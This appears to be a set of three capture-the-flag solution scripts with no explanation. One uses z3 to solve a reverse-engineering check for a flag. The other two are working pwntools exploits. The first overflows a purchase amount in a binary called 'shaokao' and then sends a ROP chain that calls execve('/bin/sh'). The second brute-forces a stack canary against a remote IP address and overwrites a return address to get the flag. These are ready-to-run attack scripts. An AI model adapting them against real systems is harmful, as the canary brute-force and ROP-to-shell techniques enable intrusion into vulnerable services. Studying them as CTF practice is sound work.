title:
from z3 import *

x1, x2, x3, x4, sum = BitVecs('x1 x2 x3 x4 sum', 64)

solver = Solver()
solver.add(
    sum == (((x1 + 0x1CE183) ^ 0x112DDF8E50094CA7 ^ 0x244FB9EB69445B4F) |
            ((x2 + 0x88E3E5) ^ 0x10CA3D978AD743E3 ^ 0x75FE10F2BA170AF1) |
            ((x3 + 0x171378) ^ 0x0F3FB14121B8606D ^ 0x2206872240FC27DC) |
            ((x4 + 0x8B3778) ^ 0x1A3DBFB3BBDAEEFB ^ 0x790B86D78A647422)) & 0xffffffffffffffff
)
solver.add(sum == 0)

if solver.check() == sat:
    model = solver.model()
    flag =''
    for i in range(4):
        var = model[eval(f'x{i+1}')]
        flag += hex(var.as_long())[2:].rjust(16, '0')
    flag = bytes.fromhex(flag).decode('ascii')
    flag = f'flag{{{flag}}}'
    print(flag)
else:
    print('unsat')

title:
from pwn import *

context.log_level = 'debug'
sh = process("./shaokao")
# sh = remote("123.56.238.150", 18916)

elf = ELF("./shaokao")
libc = elf.libc
# gdb.attach(sh, "b *0x0000000000400F6B")


syscall = 0x00000000004230a6
pop_rax = 0x0000000000458827  # pop rax ; ret
pop_rdi = 0x000000000040264f  # pop rdi ; ret
pop_rdx_rbx = 0x00000000004a404b  # pop rdx ; pop rbx ; ret
pop_rsi = 0x000000000040a67e  # pop rsi ; ret

data = 0x4E60F0


def choice():
    sh.sendline("1")  # 啤酒
    sh.sendline("2")  # 燕京U8
    sh.sendline("-100000")  # 溢出，money反向加100000
    sh.sendline("4")  # 承包摊位
    sh.sendline("5")  # 改名


choice()

# rdi=/bin/sh ,rax = 59 ,rdx=0 ,rsi=0
payload = b'/bin/sh\\x00' + p64(0)*3 + p64(data)  # 填充/bin/sh到data
payload += p64(pop_rdi) + p64(data) + p64(pop_rax) + p64(59) + \\
    p64(pop_rdx_rbx) + p64(0)*2 + p64(pop_rsi) + \\
    p64(0) + p64(syscall)  # 调用execve("/bin/sh", 0, 0)

sh.sendline(payload)

sh.interactive()

title:
from pwn import *
context.log_level = 'debug'

sh = remote('39.106.84.217', 12236)


payload = b'a'*0x61

canary = b'\\x00'

while len(canary) != 9:
    for i in range(0, 256):
        sh.sendafter(b'welcome\\n', payload+canary+chr(i).encode('latin1'))
        recv = sh.recvline().decode('utf-8')
        if recv == 'have fun\\n':
            canary += chr(i).encode('latin1')
            break
        else:
            continue


print(canary.hex())
list1 = ["\\x02", "\\x12", "\\x22", "\\x32", "\\x42", "\\x52", "\\x62", "\\x72",
         "\\x82", "\\x92", "\\xa2", "\\xb2", "\\xc2", "\\xd2", "\\xe2", "\\xf2"]

flag = ''
while '}' not in flag:
    payload = b'a'*0x61+canary+b'b'*0x8+b'\\x31' + \\
        random.sample(list1, 1)[0].encode('latin1')
    sh.send(payload)
    flag = sh.recvuntil(b'}', timeout=1).decode('utf-8')

print(flag)
sh.interactive()
